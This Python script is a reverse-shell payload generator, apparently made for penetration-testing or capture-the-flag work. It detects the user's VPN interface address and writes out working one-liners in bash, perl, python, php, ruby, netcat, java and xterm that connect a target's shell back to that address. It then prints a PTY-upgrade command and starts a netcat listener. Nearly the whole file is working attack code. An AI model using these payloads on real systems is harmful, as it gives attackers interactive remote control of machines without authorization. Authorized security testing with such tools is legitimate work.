#!/usr/bin/python

import socket
import sys
import subprocess
import netifaces as ni

def getLocalAddress():
    interface = "tun0"
    if not interface in ni.interfaces():
        interface = ni.interfaces()[0]

    addresses = ni.ifaddresses(interface)
    address = addresses[next(iter(addresses))][0]["addr"]
    return address

def generatePayload(type, local_address, port):

    if type == "bash":
        return "bash -i >& /dev/tcp/%s/%d 0>&1" % (local_address, port)
    elif type == "perl":
        return "perl -e 'use Socket;$i=\"%s\";$p=%d;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'" % (local_address, port)
    elif type == "python" or type == "python2" or type == "python3":
        binary = type
        return "%s -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" % (binary, local_address, port)
    elif type == "php":
        return "php -r '$sock=fsockopen(\"%s\",%d);exec(\"/bin/bash -i <&3 >&3 2>&3\");'" % (local_address, port)
    elif type == "ruby":
        return "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%d).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'" % (local_address, port)
    elif type == "netcat" or type == "nc":
        return "nc -e /bin/bash %s %d\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc %s %d >/tmp/f" % (local_address, port, local_address, port)
    elif type == "java":
        return "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[])\np.waitFor()" % (local_address, port)
    elif type == "xterm":
        return "xterm -display %s:1" % (local_address)

if __name__ == "__main__":

    if len(sys.argv) < 3:
        print("Usage: %s <type> <port>" % sys.argv[0])
        exit(1)

    listen_port = int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = getLocalAddress()
    payload = generatePayload(payload_type, local_address, listen_port)

    if payload is None:
        print("Unknown payload type: %s" % payload_type)
        print("Supported types: bash, perl, python[2|3], php, ruby, netcat|nc, java, xterm")
        exit(1)

    tty = "python -c 'import pty; pty.spawn(\"/bin/bash\")"
    print("---PAYLOAD---\n%s\n---TTY---\n%s\n---------\n" % (payload, tty))

    if payload_type == "xterm":
        print("You need to run the following commands (not tested):")
        print("xhost +targetip")
        print("Xnest :1")
    else:
        subprocess.call(["nc", "-lvvp", str(listen_port)])
